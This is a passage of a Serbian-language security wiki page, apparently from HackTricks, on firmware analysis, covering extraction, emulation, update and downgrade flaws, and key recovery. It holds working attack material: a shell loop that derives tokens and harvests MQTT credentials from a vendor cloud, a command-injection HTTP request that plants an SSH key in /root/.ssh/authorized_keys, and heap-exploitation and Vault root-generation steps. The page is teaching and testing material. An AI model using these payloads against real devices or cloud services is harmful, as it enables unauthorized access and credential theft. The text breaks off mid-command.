# Analiza firmware-a

{{#include ../../banners/hacktricks-training.md}}

## **Uvod**

### Povezani resursi


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je osnovni softver koji omogućava uređajima da pravilno rade tako što upravlja komunikacijom između hardverskih komponenti i softvera sa kojim korisnici stupaju u interakciju i olakšava je. Skladišti se u trajnoj memoriji, čime se obezbeđuje da uređaj može da pristupi ključnim instrukcijama od trenutka uključivanja, što dovodi do pokretanja operativnog sistema. Ispitivanje firmware-a i njegovo potencijalno menjanje predstavljaju kritičan korak u identifikovanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je kritičan početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- CPU arhitekturi i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Hardverskom rasporedu i datasheet-ovima
- Metričkim podacima o codebase-u i lokacijama izvornog koda
- External bibliotekama i tipovima licenci
- Istoriji update-a i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su od neprocenjive vrednosti, kao i analiza svih dostupnih open-source softverskih komponenti kroz ručne i automatizovane procese provere. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Nabavljanje firmware-a**

Firmware se može nabaviti na različite načine, od kojih svaki ima sopstveni nivo složenosti:

- **Direktno** iz izvora (developeri, proizvođači)
- **Build-ovanjem** prema priloženim uputstvima
- **Preuzimanjem** sa zvaničnih support sajtova
- Korišćenjem upita tipa **Google dork** za pronalaženje hostovanih firmware fajlova
- Direktnim pristupom **cloud storage-u**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **update-a** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja putem konekcija kao što su **UART**, **JTAG** ili **PICit**
- **Sniffing-om** zahteva za update unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardcoded update endpoint-a**
- **Dump-ovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i očitavanjem** memorijskog čipa, kada sve ostalo ne uspe, uz korišćenje odgovarajućih hardverskih alata

### UART-only logovi: forsiranje root shell-a putem U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (prikazuju se samo logovi), i dalje možete da forsirate init shell tako što ćete offline **izmeniti U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Dump-ujte SPI flash pomoću SOIC-8 klipse i programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locirajte U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh`, i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno kod embedded uređaja kod kojih je bootloader shell onemogućen, ali je env particija upisiva putem spoljnog pristupa flash memoriji.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izvučete informacije kako biste znali kako da mu pristupite. Za to možete koristiti različite alate:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** image-a pomoću `binwalk -E <bin>`. Ako je entropija niska, malo je verovatno da je image enkriptovan. Ako je entropija visoka, verovatno je enkriptovan (ili kompresovan na neki način).

Pored toga, možete koristiti ove alate za ekstrakciju **fajlova ugrađenih unutar firmware-a**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled fajla.

### Dobijanje fajl sistema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo je da budete u mogućnosti da **ekstrahujete fajl sistem**.\
Binwalk ga obično ekstrahuje unutar **foldera nazvanog prema tipu fajl sistema**, što je obično jedan od sledećih tipova: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručna ekstrakcija fajl sistema

Ponekad binwalk **neće imati magic byte fajl sistema u svojim potpisima**. U tim slučajevima koristite binwalk da **pronađete offset fajl sistema i izdvojite kompresovani fajl sistem** iz binarnog fajla, a zatim ga **ručno ekstrahujte** u skladu sa njegovim tipom, koristeći korake navedene u nastavku.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd command** za izdvajanje Squashfs fajl sistema.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će se nakon toga nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 filesystem-e

`$ jefferson rootfsfile.jffs2`

- Za ubifs filesystem-e sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza Firmware-a

Kada se firmware pribavi, neophodno je detaljno ga analizirati radi razumevanja njegove strukture i potencijalnih ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware image-a.

### Početni alati za analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu pri identifikovanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i filesystem-u:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenio status enkripcije image-a, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za ekstrakciju **ugrađenih datoteka**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Ekstrakcija filesystem-a

Pomoću `binwalk -ev <bin>` obično je moguće ekstraktovati filesystem, najčešće u direktorijum nazvan prema tipu filesystem-a (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip filesystem-a zbog nedostajućih magic bytes, neophodna je ručna ekstrakcija. To podrazumeva korišćenje alata `binwalk` za pronalaženje offset-a filesystem-a, nakon čega se pomoću komande `dd` filesystem izdvaja:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa filesystem-a (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza filesystem-a

Kada je filesystem izdvojen, počinje potraga za bezbednosnim propustima. Pažnja se usmerava na nebezbedne mrežne daemon-e, hardkodovane akreditive, API endpoint-e, funkcionalnosti update servera, nekompajlirani kod, startup skripte i kompajlirane binarne fajlove za offline analizu.

**Ključne lokacije** i **stavke** koje treba proveriti uključuju:

- **etc/shadow** i **etc/passwd** za korisničke akreditive
- SSL sertifikate i ključeve u direktorijumu **etc/ssl**
- Konfiguracione i script fajlove zbog potencijalnih ranjivosti
- Embedded binarne fajlove za dalju analizu
- Uobičajene web servere i binarne fajlove IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar filesystem-a:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih fajlova

I source code i kompajlirani binarni fajlovi pronađeni u filesystem-u moraju se pažljivo proveriti zbog ranjivosti. Alati kao što je **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne fajlove pomažu u identifikovanju nezaštićenih binarnih fajlova koji bi mogli biti iskorišćeni.

## Prikupljanje cloud konfiguracije i MQTT akreditiva putem izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju specifičnu za uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-ja uređaja koristeći hardkodovanu tajnu, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen kao heksadecimalna vrednost velikim slovima

Ovaj dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, često otkrivajući MQTT akreditive u plaintext-u i prefikse topic-a.

Praktičan tok rada:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju URL pattern za cloud config i adresu brokera, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Preuzmite STATIC_KEY i algoritam za token iz firmware-a

- Učitajte binarne fajlove u Ghidra/radare2 i pretražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite digest u velika slova:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupite cloud konfiguraciju i MQTT kredencijale

- Sastavite URL i preuzmite JSON pomoću curl-a; analizirajte ga pomoću jq-a da biste izdvojili tajne:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotreba plaintext MQTT-a i slabih topic ACL-ova (ako postoje)

- Koristite pronađene kredencijale za pretplatu na maintenance topic-e i potražite osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerišite predvidljive ID-jeve uređaja (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bajtove, praćene sekvencijalnim sufiksom.
- Možete iterirati kroz ID-jeve kandidata, programski izvoditi tokene i preuzimati konfiguracije:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavite izričito ovlašćenje pre pokušaja masovne enumeracije.
- Kada je moguće, prednost dajte emulaciji ili statičkoj analizi za oporavak secrets bez menjanja ciljnog hardvera.


Proces emulacije firmware-a omogućava **dynamic analysis** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove povezane sa zavisnostima od hardvera ili arhitekture, ali prenos root filesystem-a ili određenih binarnih datoteka na uređaj sa odgovarajućom arhitekturom i endianness-om, kao što je Raspberry Pi, ili na unapred pripremljenu virtuelnu mašinu, može omogućiti dalje testiranje.

### Emulacija pojedinačnih binarnih datoteka

Za ispitivanje pojedinačnih programa ključno je utvrditi endianness i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke MIPS arhitekture može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
I za instaliranje neophodnih alata za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian koristi se `qemu-mipsel`.

#### Emulacija ARM Architecture

Za ARM binarne datoteke proces je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući proces i pomažući u dinamičkoj analizi.

## Dinamička analiza u praksi

U ovoj fazi za analizu se koristi stvarno ili emulirano okruženje uređaja. Od suštinske je važnosti zadržati shell pristup OS-u i filesystem-u. Emulacija možda neće savršeno oponašati interakcije sa hardware-om, zbog čega će povremeno biti potrebno ponovno pokretanje emulacije. Analiza treba ponovo da obuhvati filesystem, da iskoristi izložene webpages i network services i da istraži ranjivosti bootloader-a. Testovi integriteta firmware-a od ključne su važnosti za identifikovanje potencijalnih backdoor ranjivosti.

## Tehnike runtime analize

Runtime analiza podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje breakpoint-a i identifikovanje ranjivosti pomoću fuzzing-a i drugih tehnika.

Za embedded targets bez potpunog debugger-a, **kopirajte statički linkovani `gdbserver`** na uređaj i povežite se udaljeno:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Na IoT hubovima RF stack je često podeljen između **radio MCU-a** i Linux userland procesa. Koristan workflow je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF frame** u etru
2. **controller-side parser** na radio MCU-u
3. **serial/UART text ili TLV protocol** prosleđen Linuxu (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemonu
5. **protocol-specific handler / state machine**

Ova arhitektura stvara dva reversing cilja umesto jednog. Ako controller pretvara binarne radio frames u textual protocol kao što je `Group,Command,arg1,arg2,...`, pronađite:

- **message groups** i dispatch tables
- Koje poruke mogu doći sa **network-a**, a koje od samog controller-a
- Tačna **manufacturer-specific discriminator fields** (na primer Zigbee `manufacturer_code` i custom `cluster_command`)
- Koji handleri su dostupni samo tokom **commissioning**, discovery ili firmware/model download faza

Konkretno za Zigbee, snimite pairing saobraćaj i proverite da li se target i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, sniffing commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, zato zabeležite da li ih testirani uređaj zaista primenjuje.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands su često bolji target od standardizovanih clusters, jer prosleđuju podatke **custom parsing code-u** i internim **FSM-ovima** sa manje battle-tested validacije.<sup>[[8]](#references)</sup>

Praktičan workflow:

- Reverse-ujte command dispatcher dok ne pronađete **vendor-only handler**.
- Rekonstruišite tabele **FSM state**, **event**, **check**, **action** i **next-state**.
- Identifikujte **transitional states** koji automatski napreduju, kao i retry/error grane koje na kraju resetuju ili oslobađaju state kojim upravlja attacker.
- Potvrdite koje su legitimne protocol razmene potrebne da bi se daemon postavio u ranjivo stanje, umesto pretpostavke da je bug-oviti handler uvek dostupan.

Kod timing-sensitive protocols, packet replay iz Python framework-a može biti prespor. Pouzdaniji pristup je emulacija legitimnog uređaja na realnom hardware-u (na primer **nRF52840**) uz vendor-grade stack, kako biste mogli da izložite odgovarajuće **endpoints**, **attributes** i commissioning timing.

### Fragmented-download bug class in embedded daemons

Ponavljajuća klasa firmware bug-ova pojavljuje se kod **fragmented blob/model/configuration downloads**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragments proveravaju samo attacker-kontrolisana **packet-local** polja, kao što je `packet_total_size >= offset + chunk_len`.
3. Copy koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **original allocated size**.

Ovo omogućava attacker-u da pošalje:

- Prvi validni fragment sa **malom** deklarisanom total size vrednošću, kako bi izazvao malu heap alokaciju.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Falsifikovanu packet-local size vrednost koja zadovoljava sveže provere, ali i dalje izaziva overflow prvobitno alociranog buffer-a.

Kada se ranjiva putanja nalazi iza commissioning logike, exploitation mora da uključi dovoljno **device emulation-a** da target uvede u očekivano model-download ili blob-download stanje pre slanja malformed fragments.

### Protocol-driven `free()` triggers

U embedded daemonima, najlakši način za aktiviranje heap metadata exploitation-a često nije „čekanje cleanup-a“, već **prisiljavanje protocol-ovog sopstvenog error handling-a**:<sup>[[8]](#references)</sup>

- Pošaljite malformed follow-up fragments kako biste FSM pomerili u **retry** ili **error** states.
- Pređite retry threshold kako bi daemon **resetovao context** i oslobodio corrupted buffer.
- Iskoristite ovaj predvidljiv `free()` da aktivirate allocator-side primitives pre nego što se process sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv **musl/uClibc/dlmalloc-like** allocator-a u embedded Linux-u, gde korumpiranje chunk metadata može pretvoriti unlink/unbin logiku u write primitive. Stabilan obrazac je korumpiranje **size field-a** kako bi se allocator traversal preusmerio u **fake chunks** postavljene unutar overflow-ovanog buffer-a, umesto trenutnog prepisivanja stvarnih bin pointers i rušenja process-a.

## Binary Exploitation and Proof-of-Concept

Razvoj PoC-a za identifikovane ranjivosti zahteva duboko razumevanje target architecture i programiranje u lower-level languages. Binary runtime protections u embedded systems su retke, ali kada postoje, tehnike kao što je Return Oriented Programming (ROP) mogu biti neophodne.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slične onima u glibc-u. Kasnija velika alokacija može pokrenuti `__malloc_consolidate()`, zato svaki fake chunk mora proći provere (razumna size vrednost, `fd = 0` i susedni chunks prepoznati kao "in use").<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ako je ASLR omogućen, ali je glavni binary **non-PIE**, adrese unutar binary-ja u `.data/.bss` su stabilne. Možete ciljati region koji već liči na validan heap chunk header, kako biste fastbin allocation postavili na **function pointer table**.
- **Parser-stopping NUL:** kada se JSON parsira, `\x00` u payload-u može zaustaviti parsing, uz zadržavanje preostalih attacker-kontrolisanih bytes za stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može postaviti izvršni shellcode u poznati mapping i skočiti na njega.

## Prepared Operating Systems for Firmware Analysis

Operating systems kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prekonfigurisana okruženja za firmware security testing, opremljena neophodnim tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen obavljanju security assessment-a i penetration testing-a Internet of Things (IoT) uređaja. Štedi mnogo vremena pružanjem prekonfigurisanog okruženja sa svim učitanim neophodnim tools.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system za embedded security testing, zasnovan na Ubuntu 18.04 i unapred opremljen firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Čak i kada vendor primenjuje cryptographic signature checks za firmware images, **version rollback (downgrade) protection je često izostavljen**. Kada boot- ili recovery-loader samo proverava signature pomoću ugrađenog public key-a, ali ne poredi *version* (ili monotonic counter) image-a koji se flash-uje, attacker može legitimno instalirati **stariji, ranjivi firmware koji i dalje ima validan signature** i tako ponovo uvesti patched vulnerabilities.<sup>[[4]](#references)</sup>

Tipičan attack workflow:

1. **Nabavite stariji signed image**
* Preuzmite ga sa vendor-ovog public download portal-a, CDN-a ili support site-a.
* Izvucite ga iz pratećih mobile/desktop applications (npr. unutar Android APK-a u `assets/firmware/`).
* Preuzmite ga iz third-party repositories kao što su VirusTotal, Internet archives, forums itd.
2. **Upload-ujte ili poslužite image uređaju** putem bilo kog izloženog update channel-a:
* Web UI, mobile-app API, USB, TFTP, MQTT itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoints koji prihvataju Base64-encoded firmware blobs, dekoduju ih server-side i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristite vulnerability koja je patched u novijem release-u (na primer command-injection filter koji je dodat kasnije).
4. Opciono ponovo flash-ujte najnoviji image ili onemogućite updates kako biste izbegli detection nakon sticanja persistence-a.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgraded) firmware-u, parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava injection proizvoljnih komandi (ovde – omogućavanje root pristupa zasnovanog na SSH ključevima). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali odsustvo downgrade zaštite čini ovu ispravku beskorisnom.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači uključuju kompletne firmware image-e u svoje prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj preko Bluetooth-a/Wi-Fi-ja. Ovi paketi se obično čuvaju nešifrovani u APK/APEX fajlu, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju preuzimanje potpisanih image-a bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback zaštite samo kroz updater u A/B dizajnima slotova

Neki vendor-i zaista implementiraju anti-downgrade **ratchet**, ali samo unutar logike *updater*-a (na primer, UDS rutina preko CAN-a, recovery komanda ili userspace OTA agent). Ako **bootloader** kasnije proverava samo potpis/CRC image-a i veruje particionoj tabeli ili metadata-i slota, rollback zaštita se i dalje može zaobići.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Firmware metadata sadrži i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater upoređuje ratchet image-a sa vrednošću sačuvanom u persistent storage-u i odbija starije potpisane image-e.
- **Bootloader** ne parsira taj ratchet i samo proverava header, CRC i potpis pre bootovanja izabranog slota.
- Aktivacija slota čuva se odvojeno u particionoj tabeli ili generation counter-u po slotu i nije kriptografski vezana za tačan firmware digest koji je validiran.

Ovo u dual-slot sistemima stvara primitivu **validate-one-image / boot-another-image**. Ako attacker može da natera updater da označi slot B kao sledeći boot target koristeći trenutno potpisan image, a zatim pre reboot-a prepiše slot B, bootloader i dalje može da bootuje downgraded image jer veruje samo već upisanoj metadata-i slota.

Uobičajen obrazac zloupotrebe:

1. Upload-ujte **current signed** firmware u pasivni slot i pokrenite normalnu validation/switch rutinu tako da layout označi taj slot kao sledeći aktivni.
2. **Još nemojte rebootovati**. Ponovo uđite u slot-preparation/erase rutinu u istoj sesiji.
3. Zloupotrebite zastarelu boot-state ili zastarelu slot-selection logiku tako da updater obriše **isti fizički slot** koji je upravo promovisan.
4. Upišite **older but still signed** firmware u taj slot.
5. Preskočite validation rutinu koja sprovodi ratchet i direktno rebootujte.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i bootuje stari image.

Stvari koje treba tražiti prilikom reverse engineering-a A/B update implementacija:

- Izbor slota izveden iz **boot-time flag-ova** koji se ne osvežavaju nakon uspešnog switch-a.
- Rutina u stilu `prepare_passive_slot()` koja briše slot na osnovu zastarelog state-a umesto **trenutnog committed layout-a**.
- Funkcija u stilu `part_write_layout()` koja samo uvećava **generation counter** / active flag i ne čuva hash validiranog image-a.
- Ratchet provere implementirane u userspace-u ili updater kodu, ali **ne** u ROM / bootloader / secure boot fazama.
- Erase ili recovery rutine koje ostavljaju slot označenim kao bootable čak i nakon što je njegov sadržaj obrisan i ponovo upisan.

### Checklist za procenu update logike

* Da li su transport/authentication *update endpoint*-a adekvatno zaštićeni (TLS + authentication)?
* Da li uređaj poredi **version numbers** ili **monotonic anti-rollback counter** pre flash-ovanja?
* Da li se image proverava unutar secure boot lanca (npr. potpise proverava ROM kod)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo signature/CRC?
* Da li su metadata-e za aktivaciju slota **vezane za validated firmware digest/version**, ili se slot može izmeniti nakon promocije?
* Nakon uspešnog switch-a slota, da li je uređaj primoran da rebootuje ili su kasnije update/erase rutine i dalje dostupne u istoj sesiji?
* Da li userland kod obavlja dodatne sanity provere (npr. dozvoljena mapa particija, broj modela)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu validation logiku?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranjivi firmware za vežbu

Za vežbanje otkrivanja ranjivosti u firmware-u, koristite sledeće projekte ranjivog firmware-a kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Preuzimanje ključeva za dešifrovanje firmware-a iz ugrađenog KMS/Vault state-a

Kada update image kombinuje male plaintext metadata-e sa velikim blob-om visoke entropije, pre brute-force pokušaja uradite triage containera:<sup>[[1]](#references)</sup>

- Dump-ujte headere, offset-e i granice linija pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: narednih 8 bajtova predstavljaju salt, a preostali bajtovi ciphertext.
- Base64 polje koje se dekoduje u tačno `256` bajtova snažan je pokazatelj da posmatrate RSA-2048 ciphertext koji obavija nasumičnu firmware lozinku/session key.
- Detached PGP materijal u istom fajlu često štiti samo authenticity; nemojte pretpostaviti da je to mehanizam confidentiality-ja.

Ako static key hunting (`grep`, `strings`, PEM/PGP pretrage) ne uspe, reverse-engineer-ujte **operational decrypt path** umesto da samo tražite private keys:

- Decompile-ujte updater / management binary i pratite ko čita encrypted blob, koji helper/API ga unwrap-uje i koje logical key name zahteva.
- Pretražite ekstrahovani root filesystem za KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit fajlove i init skripte.
- Tretirajte plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ili lokalne KMS auto-unseal skripte kao ekvivalent private-key materijalu.

Ako appliance isporučuje originalni Vault binary i storage backend, replay-ovanje tog okruženja obično je jednostavnije nego ponovno implementiranje Vault internals-a:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
